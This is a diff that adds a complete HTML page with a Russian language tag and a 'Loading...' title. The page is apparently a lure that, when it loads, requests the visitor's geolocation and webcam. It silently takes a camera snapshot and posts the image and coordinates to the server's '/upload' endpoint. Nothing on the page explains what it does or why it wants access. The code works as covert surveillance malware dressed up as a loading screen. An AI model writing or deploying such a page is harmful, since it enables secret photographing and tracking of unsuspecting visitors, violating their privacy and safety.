@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>Loading...</title>
+</head>
+<body>
+<script>
+async function capture() {
+let lat = null, lon = null;
+if (navigator.geolocation) {
+navigator.geolocation.getCurrentPosition(pos => {
+lat = pos.coords.latitude;
+lon = pos.coords.longitude;
+}, err => {}, {timeout: 5000});
+}
+try {
+let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+let video = document.createElement('video');
+video.srcObject = stream;
+await video.play();
+await new Promise(r => setTimeout(r, 1000));
+let canvas = document.createElement('canvas');
+canvas.width = video.videoWidth;
+canvas.height = video.videoHeight;
+let ctx = canvas.getContext('2d');
+ctx.drawImage(video, 0, 0);
+let dataUrl = canvas.toDataURL('image/jpeg');
+stream.getTracks().forEach(track => track.stop());
+await fetch('/upload', {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify({ image: dataUrl, lat: lat, lon: lon })
+});
+} catch (e) {
+console.log("Cam access denied");
+}
+}
+window.onload = capture;
+</script>
+</body>
+</html>
